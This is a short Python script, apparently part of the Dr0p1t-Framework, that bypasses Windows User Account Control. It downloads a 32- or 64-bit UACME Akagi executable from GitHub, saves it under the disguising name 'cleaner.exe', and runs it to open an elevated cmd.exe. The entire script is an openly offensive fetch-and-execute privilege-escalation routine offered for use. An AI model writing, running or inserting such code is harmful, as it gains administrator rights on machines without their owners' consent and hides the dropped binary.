#((Todo list))
#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to bypass UAC by downloading and using UACme tool (¯\_(ツ)_/¯)
#Start

def get_ready():
    import urllib,platform,os
    url32 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi32.exe"
    url64 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi64.exe"
    url   = ""
    #check architecture
    if platform.architecture()[0][:2] == '64':
        url = url64
    elif platform.architecture()[0][:2] == '32':
        url = url32
    x = urllib.request.urlretrieve(url,"cleaner.exe")
    xx = os.popen("cleaner.exe 3 cmd.exe")
